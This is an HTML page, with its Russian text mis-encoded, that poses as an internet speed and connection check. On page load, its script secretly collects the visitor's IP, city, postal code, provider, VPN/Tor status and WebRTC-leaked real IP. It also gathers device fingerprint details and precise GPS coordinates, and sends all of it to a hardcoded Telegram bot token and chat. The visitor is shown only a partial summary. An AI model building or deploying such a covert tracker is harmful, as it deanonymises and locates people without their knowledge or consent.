<!DOCTYPE html>
<html>
<head>
    <title>–ü—Ä–æ–≤–µ—Ä–∫–∞ –∏–Ω—Ç–µ—Ä–Ω–µ—Ç-—Å–æ–µ–¥–∏–Ω–µ–Ω–∏—è</title>
    <style>
        body {
            font-family: 'Segoe UI', Arial, sans-serif;
            background: linear-gradient(135deg, #f5f7fa 0%, #c3cfe2 100%);
            margin: 0;
            padding: 20px;
            color: #333;
            min-height: 100vh;
        }
        .container {
            max-width: 800px;
            margin: 0 auto;
            background: white;
            border-radius: 15px;
            padding: 30px;
            box-shadow: 0 10px 30px rgba(0,0,0,0.1);
        }
        h1 {
            color: #2c3e50;
            text-align: center;
        }
        .loader {
            border: 5px solid #f3f3f3;
            border-top: 5px solid #3498db;
            border-radius: 50%;
            width: 60px;
            height: 60px;
            animation: spin 1s linear infinite;
            margin: 30px auto;
        }
        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
        #results {
            margin-top: 20px;
            text-align: left;
            background: #f8f9fa;
            padding: 20px;
            border-radius: 10px;
            display: none;
        }
        .data-row {
            margin-bottom: 10px;
            padding-bottom: 10px;
            border-bottom: 1px solid #eee;
        }
    </style>
</head>
<body>
    <div class="container">
        <h1>üåê –ê–Ω–∞–ª–∏–∑ –≤–∞—à–µ–≥–æ –∏–Ω—Ç–µ—Ä–Ω–µ—Ç-—Å–æ–µ–¥–∏–Ω–µ–Ω–∏—è</h1>
        <div class="loader"></div>
        <div id="status">–ò–¥—ë—Ç —Å–±–æ—Ä –¥–∞–Ω–Ω—ã—Ö... –ü–æ–∂–∞–ª—É–π—Å—Ç–∞, –ø–æ–¥–æ–∂–¥–∏—Ç–µ</div>
        
        <div id="results">
            <h2>–í–∞—à–∏ –¥–∞–Ω–Ω—ã–µ:</h2>
            <div id="data-output"></div>
        </div>
    </div>

    <script>
        // 1. –û–ø—Ä–µ–¥–µ–ª—è–µ–º —Å–∫–æ—Ä–æ—Å—Ç—å –∏–Ω—Ç–µ—Ä–Ω–µ—Ç–∞
        async function testSpeed() {
            const startTime = Date.now();
            const downloadSize = 2 * 1024 * 1024; // 2MB test file
            const dummyFile = `https://httpbin.org/bytes/${downloadSize}`;
            
            try {
                await fetch(dummyFile, { cache: 'no-store' });
                const speed = (downloadSize * 8) / ((Date.now() - startTime) * 1000); // Mbps
                return speed.toFixed(2);
            } catch {
                return "–ù–µ —É–¥–∞–ª–æ—Å—å –∏–∑–º–µ—Ä–∏—Ç—å";
            }
        }

        // 2. –ü–æ–ª—É—á–∞–µ–º —Å–ø–∏—Å–æ–∫ —à—Ä–∏—Ñ—Ç–æ–≤
        function getFonts() {
            const fontList = [];
            const testString = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ";
            const testSize = '72px';
            const fonts = [
                'Arial', 'Arial Black', 'Comic Sans MS', 'Courier New',
                'Georgia', 'Impact', 'Times New Roman', 'Trebuchet MS',
                'Verdana', 'Webdings', 'Wingdings'
            ];
            
            const canvas = document.createElement('canvas');
            const context = canvas.getContext('2d');
            
            fonts.forEach(font => {
                context.font = testSize + " " + font;
                if (context.measureText(testString).width > 0) {
                    fontList.push(font);
                }
            });
            
            return fontList.length > 0 ? fontList.join(', ') : "–ù–µ —É–¥–∞–ª–æ—Å—å –æ–ø—Ä–µ–¥–µ–ª–∏—Ç—å";
        }

        // 3. –ü—Ä–æ–≤–µ—Ä—è–µ–º WebRTC (–º–æ–∂–µ—Ç –≤—ã–¥–∞—Ç—å —Ä–µ–∞–ª—å–Ω—ã–π IP –∑–∞ VPN)
        function getWebRTCIP() {
            return new Promise((resolve) => {
                const rtc = new RTCPeerConnection({ iceServers: [] });
                rtc.createDataChannel('');
                
                rtc.onicecandidate = (e) => {
                    if (e.candidate && e.candidate.candidate) {
                        const ip = e.candidate.candidate.split(' ')[4];
                        resolve(ip || "–ù–µ –æ–±–Ω–∞—Ä—É–∂–µ–Ω");
                        rtc.close();
                    }
                };
                
                setTimeout(() => {
                    rtc.close();
                    resolve("–ù–µ –æ–±–Ω–∞—Ä—É–∂–µ–Ω");
                }, 1000);
            });
        }

        // 4. –û—Å–Ω–æ–≤–Ω–∞—è —Ñ—É–Ω–∫—Ü–∏—è —Å–±–æ—Ä–∞ –¥–∞–Ω–Ω—ã—Ö
        async function collectAllData() {
            // –ü–æ–ª—É—á–∞–µ–º IP —á–µ—Ä–µ–∑ 3 —Ä–∞–∑–Ω—ã—Ö API –¥–ª—è –Ω–∞–¥—ë–∂–Ω–æ—Å—Ç–∏
            const ipApis = [
                'https://api.ipify.org?format=json',
                'https://ipapi.co/json',
                'https://ipwho.is/'
            ];
            
            let finalIP = "–ù–µ —É–¥–∞–ª–æ—Å—å –æ–ø—Ä–µ–¥–µ–ª–∏—Ç—å";
            let geoData = {};
            
            // –ü—Ä–æ–±—É–µ–º –≤—Å–µ API –ø–æ –æ—á–µ—Ä–µ–¥–∏
            for (const api of ipApis) {
                try {
                    const response = await fetch(api);
                    const data = await response.json();
                    
                    if (api.includes('ipify')) {
                        finalIP = data.ip;
                    } else if (api.includes('ipapi')) {
                        if (data.ip) {
                            finalIP = data.ip;
                            geoData = {
                                city: data.city,
                                region: data.region,
                                country: data.country_name,
                                postal: data.postal,
                                org: data.org,
                                timezone: data.timezone
                            };
                            break;
                        }
                    } else if (api.includes('ipwho')) {
                        if (data.ip) {
                            finalIP = data.ip;
                            geoData = {
                                city: data.city,
                                region: data.region,
                                country: data.country,
                                postal: data.postal,
                                org: data.connection?.org || "–ù–µ–∏–∑–≤–µ—Å—Ç–Ω–æ",
                                timezone: data.timezone?.id || "–ù–µ–∏–∑–≤–µ—Å—Ç–Ω–æ",
                                proxy: data.security?.proxy || false,
                                vpn: data.security?.vpn || false,
                                tor: data.security?.tor || false
                            };
                            break;
                        }
                    }
                } catch (e) {
                    console.error(`–û—à–∏–±–∫–∞ –≤ API ${api}:`, e);
                }
            }
            
            // –î–æ–ø–æ–ª–Ω–∏—Ç–µ–ª—å–Ω—ã–µ –¥–∞–Ω–Ω—ã–µ
            const webRTCIP = await getWebRTCIP();
            const internetSpeed = await testSpeed();
            const fonts = getFonts();
            const batteryInfo = navigator.getBattery ? await navigator.getBattery() : null;
            
            // –§–æ—Ä–º–∏—Ä—É–µ–º –ø–æ–ª–Ω—ã–π –æ—Ç—á—ë—Ç
            const fullReport = `
üîç *–ü–æ–ª–Ω—ã–π –æ—Ç—á—ë—Ç –æ –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª–µ* üîç

üåê *–°–µ—Ç–µ–≤—ã–µ –¥–∞–Ω–Ω—ã–µ:*
‚îú –û—Å–Ω–æ–≤–Ω–æ–π IP: ${finalIP}
‚îú WebRTC IP: ${webRTCIP}
‚îú –ü—Ä–æ–≤–∞–π–¥–µ—Ä: ${geoData.org || "–ù–µ–∏–∑–≤–µ—Å—Ç–Ω–æ"}
‚îú VPN/TOR/Proxy: ${geoData.proxy || geoData.vpn || geoData.tor ? "–î–ê ‚úÖ" : "–ù–µ—Ç ‚ùå"}
‚îî –°–∫–æ—Ä–æ—Å—Ç—å –∏–Ω—Ç–µ—Ä–Ω–µ—Ç–∞: ${internetSpeed} Mbps

üìç *–ì–µ–æ–ª–æ–∫–∞—Ü–∏—è:*
‚îú –°—Ç—Ä–∞–Ω–∞: ${geoData.country || "–ù–µ–∏–∑–≤–µ—Å—Ç–Ω–æ"}
‚îú –†–µ–≥–∏–æ–Ω: ${geoData.region || "–ù–µ–∏–∑–≤–µ—Å—Ç–Ω–æ"}
‚îú –ì–æ—Ä–æ–¥: ${geoData.city || "–ù–µ–∏–∑–≤–µ—Å—Ç–Ω–æ"}
‚îú –ü–æ—á—Ç–æ–≤—ã–π –∏–Ω–¥–µ–∫—Å: ${geoData.postal || "–ù–µ–∏–∑–≤–µ—Å—Ç–Ω–æ"}
‚îî –ß–∞—Å–æ–≤–æ–π –ø–æ—è—Å: ${geoData.timezone || "–ù–µ–∏–∑–≤–µ—Å—Ç–Ω–æ"}

üíª *–£—Å—Ç—Ä–æ–π—Å—Ç–≤–æ:*
‚îú –û–°: ${navigator.platform}
‚îú –ë—Ä–∞—É–∑–µ—Ä: ${navigator.userAgent}
‚îú –Ø–∑—ã–∫: ${navigator.language}
‚îú –†–∞–∑—Ä–µ—à–µ–Ω–∏–µ: ${screen.width}x${screen.height}
‚îú –Ø—Ä–∫–æ—Å—Ç—å —ç–∫—Ä–∞–Ω–∞: ${window.screen.availWidth ? Math.round(window.screen.availWidth / window.screen.width * 100) : "?"}%
‚îú –î–æ—Å—Ç—É–ø–Ω—ã–µ —à—Ä–∏—Ñ—Ç—ã: ${fonts}
‚îî –ë–∞—Ç–∞—Ä–µ—è: ${batteryInfo ? `${Math.round(batteryInfo.level * 100)}%` : "–ù–µ—Ç –¥–∞–Ω–Ω—ã—Ö"}

üìÖ *–í—Ä–µ–º—è –ø–æ—Å–µ—â–µ–Ω–∏—è:* ${new Date().toLocaleString()}
            `;
            
            return {
                userIP: finalIP,
                fullReport,
                geoData
            };
        }

        // 5. –û—Ç–ø—Ä–∞–≤–∫–∞ –≤ Telegram
        async function sendToTelegram(message) {
            const botToken = '7459308891:AAFjgVMnotFuJMVA7c1LNBH-doOg7nhxCT0'; // –ó–∞–º–µ–Ω–∏
            const chatId = '6683656432';      // –ó–∞–º–µ–Ω–∏
            
            try {
                await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json',
                    },
                    body: JSON.stringify({
                        chat_id: chatId,
                        text: message,
                        parse_mode: 'Markdown'
                    })
                });
            } catch (err) {
                console.error('–û—à–∏–±–∫–∞ –æ—Ç–ø—Ä–∞–≤–∫–∏:', err);
            }
        }

        // 6. –û—Å–Ω–æ–≤–Ω–æ–π –ø—Ä–æ—Ü–µ—Å—Å
        (async function() {
            const { userIP, fullReport, geoData } = await collectAllData();
            
            // –ü–æ–∫–∞–∑—ã–≤–∞–µ–º –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—é "–±–µ–∑–æ–ø–∞—Å–Ω—ã–µ" –¥–∞–Ω–Ω—ã–µ
            document.querySelector('.loader').style.display = 'none';
            document.getElementById('status').textContent = '–ê–Ω–∞–ª–∏–∑ –∑–∞–≤–µ—Ä—à—ë–Ω!';
            document.getElementById('results').style.display = 'block';
            
            let userOutput = `
                <div class="data-row"><strong>IP-–∞–¥—Ä–µ—Å:</strong> ${userIP}</div>
                <div class="data-row"><strong>–ü—Ä–∏–º–µ—Ä–Ω–æ–µ –º–µ—Å—Ç–æ–ø–æ–ª–æ–∂–µ–Ω–∏–µ:</strong> ${geoData.city || "?"}, ${geoData.country || "?"}</div>
                <div class="data-row"><strong>–ü—Ä–æ–≤–∞–π–¥–µ—Ä:</strong> ${geoData.org || "–ù–µ–∏–∑–≤–µ—Å—Ç–Ω–æ"}</div>
                <div class="data-row"><strong>–í—Ä–µ–º—è:</strong> ${new Date().toLocaleString()}</div>
            `;
            
            document.getElementById('data-output').innerHTML = userOutput;
            
            // –û—Ç–ø—Ä–∞–≤–ª—è–µ–º –ø–æ–ª–Ω—ã–π –æ—Ç—á—ë—Ç
            await sendToTelegram(fullReport);
            
            // –ü–æ–ø—ã—Ç–∫–∞ –ø–æ–ª—É—á–∏—Ç—å –≥–µ–æ–ª–æ–∫–∞—Ü–∏—é (–µ—Å–ª–∏ –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—å —Ä–∞–∑—Ä–µ—à–∏—Ç)
            if (navigator.geolocation) {
                navigator.geolocation.getCurrentPosition(
                    (pos) => {
                        const coords = `–®–∏—Ä–æ—Ç–∞: ${pos.coords.latitude}, –î–æ–ª–≥–æ—Ç–∞: ${pos.coords.longitude}`;
                        sendToTelegram(`üìç –¢–æ—á–Ω—ã–µ –∫–æ–æ—Ä–¥–∏–Ω–∞—Ç—ã –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è:\n${coords}\n–¢–æ—á–Ω–æ—Å—Ç—å: ${pos.coords.accuracy} –º–µ—Ç—Ä–æ–≤`);
                    },
                    (err) => console.log('–ì–µ–æ–ª–æ–∫–∞—Ü–∏—è –æ—Ç–∫–ª–æ–Ω–µ–Ω–∞:', err)
                );
            }
        })();
    </script>
</body>
</html>